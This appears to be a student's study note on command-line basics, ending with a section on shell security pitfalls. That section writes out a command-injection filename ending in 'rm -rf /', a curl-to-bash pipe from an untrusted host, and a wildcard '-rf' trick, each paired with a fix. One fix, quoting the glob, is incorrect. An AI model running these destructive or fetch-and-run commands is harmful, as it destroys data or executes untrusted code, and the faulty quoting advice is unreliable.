---
aliases: []
date created: Wednesday, 10. December 2025, 19:12
date modified: Wednesday, 10. December 2025, 20:12
---

# CLI Notes - Hreimur
## History
- **1950s (Batch processing):** Punch cards, no UI, hours of wait time
- **1960 - 1980 (CLI Era):** Time sharing, terminals, Unix (1969) introduced shell & piping, MS-DOS (1981)
- **1970-1990 (GUI Birth):** Xerox PARC (1973) - WIMP metaphor, Mac (1984), Windows 95
- **2000s-Present:** Linux dominates servers, Mac OS X (Unix + GUI), headless cloud servers

## Why Use CLI?
**Efficiency & Workflow:**
- Faster keyboard driven workflows
- Wildcards/regex for pattern matching
- Piping for complex workflows
- Automation via scripts/cron
**Power & Control:**
- Access 100% of features (not just GUI’s 80%)
- Override safety rails (sudo and force flags)
- Better error messages
- CLI first tools (Git, Docker and npm)
**Infrastructure:**
- Remote server management (SSH)
- Low resource usage
- System rescue when GUI crashes
- Direct kernel access
**Consistency**
- Same commands across platforms
- Stable through time (1970s commands still work)
- Easier to communicate instructions

## Shells Comparison

| Shell      | Platform   | Key Features                                         |
| ---------- | ---------- | ---------------------------------------------------- |
| Bash       | Linux/Unix | POSIX compliant, default on most Linux, text streams |
| Zsh        | macOS      | More customizable, advanced features                 |
| PowerShell | Windows    | Verb-Noun syntax, pipes .NET object(not text)        |
| WSL        | Windows    | Run Bash/Zsh on Windows                              |

## Essential commands
Navigation & Files
```bash
pwd # prints directory
ls / ls -la # list files / hidden files
cd # change directory
touch file # create a file
cp / mv / rm # copy / move. delete
rm -rf # force recursive delete
man <command> # show manual
history # command history CTRL+R to search
```
Reading & Searching
```bash
cat # read content
less # pager
head -n 10 # first 10 lines
tail -n 10 # last 10 lines
tail -f # live log
grep "txt" # search text
find . -name "X" # find file
grep -r 'txt' # find by config
```
Text Processing

| Tool  | Purpose               | Example                       |
| ----- | --------------------- | ----------------------------- |
| `tr`  | Char Swapper          | `echo "hi" \| tr 'a-z' 'A-Z'` |
| `cut` | Slicer (CSV)          | `cut -d"," -f1 data.csv`      |
| `sed` | Regex replace         | `sed 's/cat/dog/g' file.txt`  |
| `awk` | Spreadsheet (columns) | `ps aux \| awk '{print $2}'`  |
Admin & Networking
```bash
sudo command # superuser permissions
ps / kill PID # process management
curl url # web request
```

## Pipes & Patterns
Pipes `|` : Connect output of one command to input of another
```bash
ls -l | sort -nk5 | tail -n3 # find the 3 largest files
```
File globs vs reges:
**Globs:** Shell interpret for filenames (`*.txt,?` = any single char)
**Regex:** Tools interpret for text content (`.`= any char, `*`star = zero or more)
Regex cheatsheet: `.` any char, `^` start of line, `$` end of line, `*` zero or more, `[a-z]` char range, `(X|Y)` X or Y

## Loops & functions
bash loop:
```bash
for f in *.txt; do
	mv "$f" "$f.bak"
done
```
bash function:
```bash
greet() {
	echo "Hello $1" # $1 = first argument
}
greet "John"
```
**PowerShell**: Use `foreach`, `ForEach-Object`, named parameters in `param()` block

## Script Files

| Shell      | Extension | Header        | Execution                           |
| ---------- | --------- | ------------- | ----------------------------------- |
| Bash       | `.sh`       | `#!/bin/bash` | `chmod +x file.sh` then `./file.sh` |
| Powershell | `.ps1`      | None          | `.\file.ps1` (no execution policy)  |
| CMD        | `.bat`      | `@echo off`   | Just type filename                  |
Shebang (`#!`): First line tells OS which interpreter to use

## Editors

| Editor | Type      | Notes                                         |
| ------ | --------- | --------------------------------------------- |
| Nano   | Beginner  | Modeless, instructions on screen              |
| Vim    | Standard  | Modal (Insert/Command mode) fast once learned |
| Emacs  | Ecosystem | Programmable, complex key combos              |
Exit Vim: <kbd>Esc</kbd> `:q!` <kbd>Enter</kbd>

## Vulnerabilities
**Shell injection**
```bash
rm $filename
```
Attack: filename = “`file.txt; rm -rf /`” how to fix it: `rm "$filename"` always quote the vars bro
**Curl Bash Anti Pattern**
```bash
curl http://untrusted.com/script.sh | bash
```
don’t do this, download it first and inspect it and then maybe run it
**History File Leaks**
```bash
mysql -pSecret123
```
the password was now saved to `.bash_history`, to fix this use interactive prompts or environment vars
**Path hijacking**
don’t add `.` (current dir) to `$PATH`, attack can create fake `ls` commands that run malware
**Permission Laziness**
```bash
chmod 777 file
```
Everyone can modify this, just use the principle of least privilege
**Wildcard Injection**
Attacker can create files named “`-rf`”
```bash
rm * # Expands to rm file1 file2 -rf
```
Fix: `rm ./*` or use `--` (`rm -- *` )
**Running as root** Always use standard user + `sudo` when needed, Typo hazard: `rm -rf / home` space after the `/` deletes EVERYTHING

## Bash vs PowerShell diffs

| Feature      | Bash         | PowerShell          |
| ------------ | ------------ | ------------------- |
| Pipes        | Text Streams | .Net Objects        |
| Variables    | `$var`       | `$_` in pipeline    |
| Columns      | `awk`, `cut` | `Select-Object`     |
| Text Replace | `sed`        | `-replace` operator |
| Aliases      | Same flags   | Different Flags!    |

## Wildcard Injection Prevention
Problem: How to prevent attacks like `rm *` when attacker creates a file named `-rf`?
- Use `--` to end options `rm -- *`
- use `./` prefix: `rm ./*`
- Quote the glob: `rm " * "`
- Never run commands in untrusted dirs as root

## Curl bash Problem
Task: Find recent supply chain attack where remote script was compromised
Verify the integrity: Download the script first, Check file hash against published checksums, Inspect the code manually, Use GPG signatures if available, Check HTTPS certificate, Review source repo history and only then run it.

## Principle of least privilege
Why sudo > logging in as root
Audit trail: `var/log/auth.log` tracks who did what, Requires a password which can prevent accidental commands, Time limited: sudo access expires, Selective: Can grant specific commands only, Reversible: easy to revoke access.
Audit trail example: Shows “User X ran command Y at time Z”
